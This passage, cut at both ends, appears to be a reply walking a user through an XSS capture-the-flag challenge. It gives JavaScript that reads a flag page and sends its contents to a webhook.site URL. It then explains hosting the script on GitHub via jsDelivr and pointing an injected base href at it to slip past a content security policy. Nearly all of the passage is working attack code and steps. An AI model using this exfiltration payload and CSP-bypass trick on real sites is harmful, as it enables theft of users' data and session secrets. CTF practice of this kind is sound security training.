fetch('/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
    fetch('https://webhook.site/bd768cbb-7b2f-482a-8f91-86c61918d6af??flag=' + encodeURIComponent(flag));
  });
```

(I used your webhook URL from the previous challenge — use the same one or create a new one.)

## Step 2: Get the raw jsDelivr URL

GitHub raw URLs are blocked by some CSPs, but **jsDelivr** serves GitHub files with proper CORS headers. Your `test.js` raw URL via jsDelivr is:
```
https://cdn.jsdelivr.net/gh/stevvv2005/ctf@main/test.js
```

So the base href needs to be:
```
https://cdn.jsdelivr.net/gh/stevvv2005/ctf@main/
